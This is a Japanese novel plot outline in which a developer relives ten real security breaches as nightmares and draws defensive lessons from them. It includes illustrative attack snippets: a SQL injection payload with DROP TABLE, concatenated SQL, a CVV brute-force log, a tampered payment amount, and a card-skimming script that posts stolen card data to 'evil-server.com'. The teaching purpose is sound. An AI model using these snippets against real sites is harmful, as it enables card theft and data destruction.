【第七章「俺はセキュリティの悪夢を見る」――過去の亡霊たちが教えてくれたこと・プロット】

――――――――――――――――――――――――――――――――――
◆要約
The・World村での激動の日々を終え、疲れ果てて眠りについた俺。しかしその夜、俺は奇妙な夢を見る。それは過去に実際に起きたセキュリティ事件の「当事者」として、その瞬間を追体験する悪夢だった。SQLインジェクション、認証不備、フロントエンド改ざん…10の悪夢が俺に「セキュリティとは何か」を血と涙で教えてくれる。
――――――――――――――――――――――――――――――――――

◇シーン0：眠りへの誘い

The・World村の障害対応を終え、俺はボロボロだった。
俺「十の事件簿…毎週壊れる村…もう寝かせてくれ…」
机に突っ伏して意識が遠のく。

セキュリティ番の声が遠くで響く。「おい、ログアウトくらいしてから寝ろ…」

しかし俺の意識はすでに、深い深い眠りの底へ――。

◇シーン1：第一の夢「漏れ出すカード番号」（2013年 ECサイトSQLインジェクション事件）

目を開けると、俺は見知らぬオフィスにいた。
画面には「インテリア通販サイト 管理画面」の文字。俺はこのECサイトの開発者らしい。

上司「おい、検索機能追加してくれ。急ぎで」
俺（夢の中）「了解っす」

俺は検索クエリを実装する。文字列連結でSQLを組み立てる。
```
"SELECT * FROM users WHERE name = '" + userInput + "'"
```

俺（夢の中）「よし、動いた。リリース！」

――数ヶ月後。

画面に赤いアラートが点滅。「不正アクセス検知」
ログを見ると、誰かが検索欄にこう入力していた。
```
' OR '1'='1'; DROP TABLE credit_cards; --
```

俺（夢の中）「な…なんだこれ…データベースが…カード情報が…」

顧客のクレジットカード番号が次々と外部に流出していく。
数千件。氏名、住所、カード番号、有効期限…すべてが闇に消えていく。

上司「おい！！お前のコードのせいで！！」
俺（夢の中）「バインド機構…エスケープ処理…なんで俺は…」

【裁判所の声】「被告会社に対し、2,262万円の損害賠償を命じる」

俺「うわあああああ！！」

――目が覚める。冷や汗びっしょり。

俺「夢…だよな…？　でも待て、これ確か実際にあった事件だ…」

【教訓メモ（夢から覚めた俺のつぶやき）】
・ユーザー入力を絶対に信用するな
・SQLはプレースホルダ（バインド機構）を使え
・「動いた」と「安全」は全く別の話だ

◇シーン2：第二の夢「総当たりの恐怖」（2018年 PayPay不正利用事件）

再び眠りに落ちる俺。
今度は真新しいオフィス。壁には「○○Pay」のロゴ。スマホ決済サービスの開発現場らしい。

PM「サービスローンチだ！20%還元キャンペーンで一気にユーザー獲得するぞ！」
俺（夢の中）「クレジットカード登録機能、実装完了です！」

リリース当日。ダウンロード数がうなぎ登り。
俺（夢の中）「すげぇ…バズってる…」

しかし数日後、異変が起きる。

セキュリティチーム「おい、CVV入力の試行回数がおかしい。同一カードに対して000から999まで順番に…」
俺（夢の中）「え？」

画面に映し出される攻撃ログ。
```
CVV: 000 → 失敗
CVV: 001 → 失敗
CVV: 002 → 失敗
...
CVV: 847 → 成功！！
```

俺（夢の中）「総当たり…！　でも待て、リトライ制限は…」
セキュリティチーム「ない。実装されてない」
俺（夢の中）「3Dセキュアは…」
セキュリティチーム「ない」
俺（夢の中）「なんで俺は気づかなかった！！」

ニュース速報が流れる。「○○Pay、大規模不正利用発覚。被害額数千万円規模か」
家電量販店で高額商品を買い漁る犯人グループの映像。

PM「サービス開始3日でこの有様かよ…」

俺「やめろ…やめてくれ…！！」

――目が覚める。

俺「はぁ…はぁ…入力回数制限…多要素認証…なんで実装しなかった…」

【教訓メモ】
・認証には必ずレートリミット（試行回数制限）を
・ブルートフォース対策は設計段階から
・「便利」と「安全」のバランスを最初から考えろ
・3Dセキュアなどの追加認証は必須

◇シーン3：第三の夢「勝手に公開される私生活」（2018年 Facebookプライバシー設定バグ）

次の夢。俺は巨大なSNS企業のオフィスにいる。
壁には青いロゴ。そう、あの世界最大のSNSだ。

俺（夢の中）「新機能のテスト完了。ロールアウトします」

その機能は「投稿のオーディエンス選択ツール」の改善。
しかし俺は気づいていなかった。テスト中に入り込んだバグに。

リリースから数日後。

サポートチーム「ユーザーから問い合わせが殺到してます！『友人限定で投稿したはずが全体公開になってる』って！」
俺（夢の中）「え…？」

コードを確認する。
デフォルトの公開範囲設定が…「全員に公開」にリセットされるバグ。
5月18日から27日まで、約1,400万人のユーザーが影響を受けていた。

ユーザーの悲鳴がタイムラインを埋め尽くす。
「私の日記が全世界に公開されてた…」
「家族写真が知らない人に見られてた…」
「プライベートな投稿が…」

俺（夢の中）「1,400万人…俺のバグで…」

プライバシー責任者の声「ミスを深くお詫びする」

俺「なんでテストで気づかなかった…なんで…」

――目が覚める。

俺「プライバシー設定のテスト…デフォルト値の検証…段階的ロールアウト…」

【教訓メモ】
・プライバシーに関わる機能は特に慎重に
・デフォルト設定は「安全側」に倒せ（Privacy by Default）
・新機能は段階的にロールアウトして異常を検知しろ
・回帰テストを徹底しろ

◇シーン4：第四の夢「22行の悪意」（2018年 British Airways情報流出事件）

夢の中で、俺はロンドンの航空会社のIT部門にいた。
英国を代表する航空会社。数百万の顧客データを預かっている。

俺（夢の中）「なんか最近、サーバーの挙動がおかしいような…」

ある日、決済ページのソースコードを確認して凍りつく。
見覚えのない22行のJavaScriptコードが埋め込まれていた。

```javascript
// 攻撃者が仕込んだコード（イメージ）
document.getElementById('payment-form').addEventListener('submit', function() {
    var cardData = {
        number: document.getElementById('card-number').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value
    };
    // 攻撃者のサーバーに送信
    fetch('https://evil-server.com/steal', {
        method: 'POST',
        body: JSON.stringify(cardData)
    });
});
```

俺（夢の中）「フロントエンドが…改ざんされてる…！」

調査が進む。原因は複合的だった。
- 外部委託先のVPNアカウントが侵害された（MFA未設定）
- 特権IDのパスワードが平文でファイルに放置されていた
- 本番環境でカード情報を平文ログに記録していた

セキュリティチーム「約38万件の顧客データが流出。カード番号、CVVコードまで…」

ニュースが世界を駆け巡る。
「英国情報コミッショナー、BA社にGDPR違反で2,000万ポンドの罰金」

俺（夢の中）「28億円…フロントエンドの改ざんを検知できなかった…CSPも設定してなかった…」

被害者の声が響く。「私のカードが不正利用された…」

俺「もうやめてくれ…！！」

――目が覚める。

俺「フロントエンドのセキュリティ…CSP…SRI…改ざん検知…サプライチェーン攻撃…」

【教訓メモ】
・フロントエンドも攻撃対象になる（Magecart/Formjacking）
・Content Security Policy（CSP）で外部通信を制限しろ
・Subresource Integrity（SRI）でスクリプトの改ざんを検知
・サードパーティアクセスには必ずMFAを
・特権情報を平文で放置するな

◇シーン5：第五の夢「生年月日で乗っ取られる」（2019年 7pay不正アクセス事件）

夢の中。日本の大手コンビニチェーンのオフィス。
俺は新しいスマホ決済サービスの開発チームにいる。

PM「競合に負けるな！早くローンチだ！」
俺（夢の中）「パスワードリセット機能、実装しました」

その仕様は単純だった。
- メールアドレスを入力
- 生年月日を入力
- 新しいパスワードを設定

俺（夢の中）「これでユーザーがパスワードを忘れても大丈夫ですね」

リリース当日。CM放映。「○○ペイ、始まる」

――3日後。

サポートに怒号の電話が殺到。
「勝手にチャージされてる！」
「知らない買い物の履歴が！」
「アカウントが乗っ取られた！」

調査の結果、攻撃手法が判明。
攻撃者はターゲットのメールアドレスと生年月日（SNSで公開情報）を入手。
パスワードリセットを実行。本人確認？生年月日だけ。
二段階認証？ない。

俺（夢の中）「生年月日なんて…公開情報じゃないか…」

被害は808人、約5,500万円。
組織的な犯行グループが、電子タバコなどを買い漁っていた。

記者会見。「セキュリティの認識が甘かった…」

1ヶ月後、サービス終了のお知らせ。
わずか3ヶ月で、サービスは終焉を迎えた。

俺「サービスが…死んだ…」

――目が覚める。

俺「二段階認証…多要素認証…公開情報を認証に使うな…」

【教訓メモ】
・パスワードリセットには強固な本人確認を
・生年月日など推測可能な情報を認証に使うな
・多要素認証（MFA）は必須
・セキュリティを後回しにしたサービスは死ぬ

◇シーン6：第六の夢「逃げられないXSS」（2020年 ユニクロアプリXSS脆弱性）

夢の中。大手アパレル企業のアプリ開発チーム。

俺（夢の中）「アプリ内ブラウザでキャンペーンページを表示する機能、実装しました」

WebViewでHTMLを表示する。ユーザー名やクーポンコードも動的に埋め込む。
しかし俺は、エスケープ処理を忘れていた。

ある日、セキュリティ研究者から連絡。
「御社のアプリにXSS脆弱性があります。悪意あるサイトに誘導可能です」

俺（夢の中）「え…」

検証すると、特定の画面にアクセスすると、意図せず外部の不正サイトへ遷移してしまう。
フィッシングサイトに誘導されれば、個人情報が盗まれる恐れ。

俺（夢の中）「WebViewの入力値…エスケープしてなかった…」

JVN（脆弱性対策情報データベース）に掲載される。
「JVNDB-XXXX-XXXXXX：○○アプリにおけるクロスサイトスクリプティングの脆弱性」

緊急でアプリアップデートをリリース。
「お詫びとお願い：最新版へのアップデートをお願いします」

俺「XSSは死なない…どこにでも潜んでいる…」

――目が覚める。

【教訓メモ】
・WebViewでもXSSは起きる
・ユーザー入力は必ずエスケープ/サニタイズ
・CSP（Content Security Policy）を設定しろ
・定期的な脆弱性診断を実施しろ

◇シーン7：第七の夢「171万件の顔写真」（2021年 Omiai個人情報流出事件）

夢の中。マッチングアプリの運営会社。
壁には「出会いを、もっと」のスローガン。

俺（夢の中）「本人確認書類のアップロード機能、実装完了です」

ユーザーは運転免許証やパスポートの画像をアップロードする。
それらはクラウドストレージに保存される。

ある日、異変に気づく。
アクセスログに、大量のダウンロードリクエスト。正規のアクセスに偽装されている。

俺（夢の中）「なんだこれ…1秒に何十件も…」

調査の結果、攻撃者はストレージの認証情報を何らかの方法で入手。
正規のAPIを使って、大量の画像データをダウンロードしていた。

流出件数：171万1,756件。
内容：運転免許証（約6割）、健康保険証、パスポート…
氏名、顔写真、生年月日、住所…すべてが流出。

俺（夢の中）「退会済みユーザーのデータも…なんで消してなかった…」

ニュースが日本中を駆け巡る。
「マッチングアプリから171万件流出、本人確認書類も」

ユーザーの悲鳴。「私の免許証が…顔写真が…」

俺「171万人の顔と名前と住所が…闇に流れた…」

――目が覚める。

俺「アクセス制御…レート制限…異常検知…データの暗号化…不要データの削除…」

【教訓メモ】
・クラウドストレージのアクセス制御を厳格に
・大量ダウンロードを検知するレート制限・アラート
・保管データは暗号化しろ
・不要になったデータは適切に削除しろ
・退会ユーザーのデータ保持ポリシーを明確に

◇シーン8：第八の夢「SaaSの連鎖崩壊」（2021年 オムニECシステムXSS情報漏洩）

夢の中。EC構築SaaSを提供する会社。
多くの企業がこのプラットフォームでECサイトを運営している。

俺（夢の中）「うちのシステムを使えば、簡単にECサイトが作れますよ」

80社近くがこのSaaSを利用していた。

ある日、基幹サーバーに異変。
見知らぬプログラムが動いている。XSS脆弱性を悪用した不正プログラム。

そのプログラムは、加盟各社のECサイトの決済ページに悪意あるスクリプトを注入していた。
利用者がカード情報を入力すると、それが攻撃者のサーバーに送信される。

被害は11社に拡大。流出件数は43万件以上。クレジットカード番号も含まれていた。

俺（夢の中）「俺たちのSaaSが…踏み台にされた…」

加盟企業からの怒号。「おたくのせいでうちの顧客情報が！」
カード会社からの通知。「不正利用が多発しています」

俺「SaaSの脆弱性は…利用者全員に波及する…」

――目が覚める。

【教訓メモ】
・SaaS/プラットフォームの脆弱性は利用者全体に波及する
・サプライチェーン全体でセキュリティを考えろ
・WAFだけでは防げない攻撃もある
・定期的なペネトレーションテストを実施しろ

◇シーン9：第九の夢「他人の戸籍が出てくる」（2023年 マイナンバーカードコンビニ交付誤交付）

夢の中。俺は自治体向けシステムを開発する会社のエンジニア。
マイナンバーカードを使ったコンビニ証明書交付システムを担当している。

俺（夢の中）「住民票や戸籍謄本をコンビニで取得できる、便利なシステムです」

リリース後、システムは順調に稼働していた。
しかしある日、複数の自治体から連絡。

「市民Aさんが自分の住民票を取ろうとしたら、市民Bさんの住民票が出てきました」

俺（夢の中）「は…？」

調査の結果、システム高負荷時にセッション管理のバグが発覚。
メモリ開放が正しく行われず、直前の利用者のデータが次の利用者に紛れ込む競合状態。

川崎市、足立区、複数の自治体で同様の事故。
他人の氏名、本籍、家族構成…プライバシーの塊が、見知らぬ人に渡ってしまった。

総務省「富士通に対し厳重注意」
ニュース「マイナンバー制度への不安広がる」

俺（夢の中）「並行処理のバグ…負荷テストが足りなかった…」

俺「行政システムの信頼が…」

――目が覚める。

【教訓メモ】
・並行処理・セッション管理は細心の注意を
・高負荷時の挙動を必ずテストしろ
・排他制御、トランザクション管理を徹底
・行政システムは特に信頼性が重要

◇シーン10：第十の夢「0円で買い物し放題」（2024年 通販サイト決済改ざん詐取事件）

最後の夢。俺は通販サイトの開発者。

俺（夢の中）「決済機能、実装完了。商品をカートに入れて、金額を計算して、決済APIに送信…」

しかし俺は、フロントエンドから送られてくる金額データをそのまま信用していた。
サーバー側での再計算？していなかった。

ある日、異常な注文が大量に発生。
高額な商品券が、0円や1円で「購入」されている。

調査の結果、攻撃者の手口が判明。
ブラウザの開発者ツールで、決済リクエストの金額フィールドを書き換えていた。

```
本来: { "amount": 50000, "item": "商品券" }
改ざん後: { "amount": 0, "item": "商品券" }
```

サーバーは改ざんを検知せず、そのまま「決済完了」として処理。
被害総額：423万円分の商品券が詐取された。

俺（夢の中）「フロントからのデータを…そのまま信じてた…」

犯人は逮捕されたが、俺の心には深い傷が残った。

俺「クライアントを信用するな…サーバーで再計算しろ…」

――目が覚める。

【教訓メモ】
・クライアントからのデータは絶対に信用するな
・金額計算は必ずサーバーサイドで
・リクエストの改ざん検知（署名、ハッシュ）を実装しろ
・異常な値（0円、負の数など）をバリデーションしろ

◇シーン11：目覚め――これは夢じゃない

俺は汗だくで目を覚ます。
朝日が差し込むオフィス。机に突っ伏したまま眠っていたらしい。

俺「夢…だったのか…？」

しかし俺は知っている。
あれは夢じゃない。すべて、現実に起きた事件だ。

SQLインジェクションで2,262万円の賠償。
認証不備で5,500万円の被害とサービス終了。
フロントエンド改ざんで38万件流出、28億円の罰金。
本人確認書類171万件の流出。
行政システムの信頼崩壊。

俺「これが…セキュリティの現実…」

セキュリティ番が背後から声をかける。
「おはよう。ひどい顔してるな。悪夢でも見たか？」

俺「ああ…10個の悪夢を見た。全部、俺が当事者だった」

セキュリティ番「そうか。それは良い夢だ」

俺「良い？　冗談だろ？」

セキュリティ番「事件は、被害者がいなければ教訓にならない。お前は夢の中で被害者になれた。本当の被害者を出す前に、恐怖を知れた。それは幸運なことだ」

俺「…」

セキュリティ番「覚えておけ。セキュリティは『やらなかった』では済まない。『知らなかった』は言い訳にならない。お前が見た10の悪夢、全部『良かれと思って』『急いでいたから』『そこまで考えなかった』が原因だ」

俺「…ああ」

セキュリティ番「だから俺たちは、毎日少しずつ、壁を高くしていくんだ。完璧な防御なんてない。でも、昨日より今日、今日より明日、少しでも安全にする。それがセキュリティだ」

◇シーン12：セキュリティの十戒

俺は壁に、夢で学んだ教訓を書き出していく。

【セキュリティの十戒】

一、「ユーザー入力を信用するな」
   SQLインジェクション、XSS、改ざん…入力は常に敵だと思え。

二、「認証に手を抜くな」
   多要素認証、レートリミット、強固な本人確認。認証の穴はサービスの死。

三、「デフォルトは安全側に倒せ」
   公開より非公開、許可より拒否。最初から安全な設定を。

四、「クライアントを信じるな」
   金額も権限もサーバーで再計算・再検証しろ。

五. 「フロントエンドも守れ」
   CSP、SRI、改ざん検知。フロントは攻撃の最前線だ。

六、「並行処理を侮るな」
   セッション管理、排他制御、競合状態。高負荷時のテストを怠るな。

七、「サプライチェーンを意識しろ」
   お前のコードだけじゃない。依存先、委託先、全部がセキュリティだ。

八、「データの一生を設計しろ」
   保存、暗号化、アクセス制御、そして削除。データは預かりものだ。

九、「ログと監視を怠るな」
   異常を検知できなければ、攻撃されていることすら分からない。

十、「セキュリティは設計段階から」
   後付けの防御は穴だらけ。Security by Design。最初から考えろ。

俺「これが…俺が見た悪夢の教訓だ」

◆参考：本章で扱った実際のセキュリティ事件

1. ECサイトSQLインジェクション事件（2013年発生・2014年判決）
   - 被害：顧客クレジットカード情報数千件流出
   - 結果：開発会社に2,262万円の損害賠償命令

2. PayPay不正利用事件（2018年）
   - 被害：CVV総当たり攻撃による大規模不正利用
   - 結果：被害全額補償、緊急でアプリ改修

3. Facebookプライバシー設定バグ（2018年）
   - 被害：約1,400万人の投稿が意図せず全体公開
   - 結果：全影響者への通知と謝罪

4. British Airways情報流出事件（2018年）
   - 被害：約38万件の顧客決済情報流出
   - 結果：GDPR違反で2,000万ポンド（約28億円）の罰金

5. 7pay不正アクセス事件（2019年）
   - 被害：約808人、約5,500万円の不正利用
   - 結果：サービス開始3ヶ月で廃止

6. ユニクロアプリXSS脆弱性（2020年）
   - 被害：外部不正サイトへの誘導リスク
   - 結果：緊急アプリアップデート

7. Omiai個人情報流出事件（2021年）
   - 被害：約171万件の本人確認書類画像流出
   - 結果：個人情報保護委員会から指導

8. オムニECシステムXSS情報漏洩（2021年）
   - 被害：11社から43万件以上の顧客情報流出
   - 結果：サービス一時停止、セキュリティ体制見直し

9. マイナンバーカードコンビニ交付誤交付（2023年）
   - 被害：他人の住民票・戸籍証明書が誤交付
   - 結果：富士通に厳重注意、サービス一時停止

10. 通販サイト決済改ざん詐取事件（2024年発覚）
    - 被害：約423万円分の商品券詐取
    - 結果：犯人逮捕、脆弱性修正

◆技術的考察メモ

【攻撃手法の分類】
- インジェクション系：SQLインジェクション、XSS、コマンドインジェクション
- 認証・認可の不備：ブルートフォース、セッション管理不備、権限昇格
- 設定ミス：デフォルト設定、アクセス制御、暗号化なし
- サプライチェーン：サードパーティ脆弱性、依存ライブラリ、委託先経由

【防御の多層化（Defense in Depth）】
1. 入力検証（フロントエンド・バックエンド両方）
2. 認証・認可（MFA、レートリミット、最小権限）
3. 暗号化（通信、保存データ）
4. 監視・検知（ログ、アラート、異常検知）
5. インシデント対応（計画、訓練、復旧手順）

【セキュリティは「コスト」ではなく「投資」】
- 事後対応コスト >> 事前対策コスト
- 信頼の回復は、構築の何倍もかかる
- 「セキュリティ事故を起こさない」が最大のROI
